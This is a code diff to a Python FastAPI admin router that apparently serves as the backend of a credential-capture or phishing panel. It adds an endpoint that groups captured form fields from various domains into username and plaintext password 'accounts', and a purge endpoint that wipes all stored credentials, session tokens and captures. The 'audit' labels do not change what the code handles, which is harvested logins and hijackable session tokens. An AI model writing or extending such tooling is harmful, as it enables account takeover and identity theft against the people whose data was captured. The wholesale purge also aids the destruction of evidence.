@@ -109,6 +109,104 @@ async def list_credentials(
         logger.error(f"ADMIN_GET_CREDS_ERROR: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
+@router.get("/accounts")
+async def list_accounts(
+    page: int = Query(1, ge=1),
+    page_size: int = Query(50, ge=1, le=200),
+    domain: Optional[str] = None,
+    search: Optional[str] = None,
+    token: str = Depends(verify_token)
+):
+    """
+    Correlates extracted fields into actionable accounts.
+    Groups fields by audit_capture_id and identifies user/pass pairs.
+    """
+    try:
+        # 1. Fetch credentials with base filters
+        query = supabase_audit.table("extracted_credentials").select("*").order("timestamp", desc=True)
+        
+        if domain:
+            query = query.ilike("domain", f"%{domain}%")
+        if search:
+            query = query.or_(f"domain.ilike.%{search}%,field_value.ilike.%{search}%")
+            
+        # For simplicity in this specialized view, we fetch a larger window and aggregate in memory
+        # since SQL grouping for pivoting is complex in Supabase-py without raw RPCs.
+        response = query.execute()
+        
+        if not response.data:
+            return {"data": [], "total": 0}
+
+        # 2. Correlate fields by capture_id
+        grouped = {}
+        for cred in response.data:
+            cid = cred["audit_capture_id"]
+            if cid not in grouped:
+                grouped[cid] = {
+                    "id": cid,
+                    "domain": cred["domain"],
+                    "timestamp": cred["timestamp"],
+                    "url": cred["url"],
+                    "fields": {},
+                    "is_account": False
+                }
+            
+            name = cred["field_name"].lower()
+            val = cred["field_value"]
+            grouped[cid]["fields"][name] = val
+            
+            # Heuristic for identifying "accounts"
+            user_keys = ['user', 'email', 'login', 'id', 'account', 'phone']
+            pass_keys = ['pass', 'pwd', 'secret']
+            
+            # If we haven't confirmed it's an account yet, check if this field looks like a password
+            if not grouped[cid]["is_account"]:
+                has_pass = any(pk in name for pk in pass_keys)
+                has_user = any(uk in name for uk in user_keys)
+                if has_pass:
+                    grouped[cid]["is_account"] = True
+
+        # 3. Flatten and filter for display
+        accounts = []
+        for cid, data in grouped.items():
+            # Only include if it has at least one field (and ideally is an "account")
+            # We can expose all grouped data but prioritize user/pass identification
+            
+            # Simple heuristic for "user" and "pass" identification for the list view
+            display_user = "Unknown"
+            display_pass = "********"
+            
+            for k, v in data["fields"].items():
+                if any(pk in k for pk in ['pass', 'pwd']):
+                    display_pass = v
+                elif any(uk in k for uk in ['user', 'email', 'login']):
+                    display_user = v
+
+            accounts.append({
+                "capture_id": data["id"],
+                "domain": data["domain"],
+                "timestamp": data["timestamp"],
+                "url": data["url"],
+                "user": display_user,
+                "password": display_pass,
+                "all_fields": data["fields"]
+            })
+
+        # 4. Handle pagination for the aggregated list
+        start = (page - 1) * page_size
+        end = start + page_size
+        paginated_accounts = accounts[start:end]
+
+        return {
+            "data": paginated_accounts,
+            "total": len(accounts),
+            "page": page,
+            "page_size": page_size
+        }
+    except Exception as e:
+        logger.error(f"ADMIN_GET_ACCOUNTS_ERROR: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
 @router.delete("/captures/{capture_id}")
 async def delete_capture(capture_id: str, token: str = Depends(verify_token)):
     """Delete a specific capture record."""
@@ -150,6 +248,27 @@ async def bulk_delete_captures(payload: dict, token: str = Depends(verify_token)
         return {"status": "success", "message": f"Deleted {len(capture_ids)} records"}
     except Exception as e:
         logger.error(f"ADMIN_BULK_DELETE_ERROR: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@router.delete("/purge")
+async def purge_all_data(token: str = Depends(verify_token)):
+    """High-security deletion of ALL captured data across all tables."""
+    try:
+        # Delete from relational tables first
+        # We use a broad delete without filter to wipe everything (requires 'allow_empty_filters' or equivalent, 
+        # but in Supabase-py it's usually eq("id", "*") or a filter that always matches, 
+        # or better yet, if the table has captured_id, we can just delete().neq("id", "00000000-0000-0000-0000-000000000000"))
+        
+        # Wiping credentials
+        supabase_audit.table("extracted_credentials").delete().neq("id", 0).execute()
+        # Wiping tokens
+        supabase_audit.table("session_tokens").delete().neq("id", 0).execute()
+        # Wiping main captures
+        supabase_audit.table("audit_captures").delete().neq("domain", "null").execute()
+        
+        return {"status": "success", "message": "All database records have been purged"}
+    except Exception as e:
+        logger.error(f"ADMIN_PURGE_ERROR: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @router.patch("/credentials/{cred_id}")
